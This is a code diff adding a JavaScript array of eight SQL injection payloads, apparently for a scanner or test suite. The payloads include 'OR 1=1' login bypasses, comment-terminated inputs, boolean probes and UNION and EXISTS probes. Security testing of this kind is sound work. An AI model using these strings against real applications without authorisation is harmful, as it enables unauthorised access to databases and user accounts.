@@ -1,0 +1,10 @@
+export const sqlPayloads = [
+  `' OR '1'='1`,
+  `' OR 1=1 --`,
+  `" OR 1=1 --`,
+  `' UNION SELECT NULL --`,
+  `admin'--`,
+  `' AND 1=1 --`,
+  `' AND 1=2 --`,
+  `' OR EXISTS(SELECT * FROM users) --`
+];
